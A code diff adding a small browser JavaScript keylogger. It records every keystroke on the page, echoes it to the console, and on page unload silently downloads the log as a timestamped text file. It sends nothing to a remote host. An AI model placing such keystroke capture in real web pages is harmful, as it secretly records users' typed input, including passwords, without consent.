@@ -1,0 +1,45 @@
+let logs = [];
+
+function handleKeyPress(event) {
+    if (event.key === 'Backspace') {
+        if (logs.length > 0) {
+            if (logs[logs.length - 1] === 'Shift') {
+                logs.pop();
+            }
+            logs.pop();
+        }
+    } else {
+        if (event.key !== 'Shift') {
+            logs.push(event.key);
+        }
+    }
+    
+    console.clear();
+    logs.forEach(log => console.log(log));
+}
+
+function saveLogsToFile() {
+    const logsString = logs.join('');
+    const blob = new Blob([logsString], { type: 'text/plain' });
+    const timestamp = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d+Z/, '');
+    const filename = `key_logs_${timestamp}.txt`;
+
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = filename;
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    
+    a.click();
+    
+    document.body.removeChild(a);
+    URL.revokeObjectURL(a.href);
+}
+
+document.addEventListener('keydown', handleKeyPress);
+
+window.addEventListener('beforeunload', function() {
+    if (logs.length > 0) {
+        saveLogsToFile();
+    }
+});
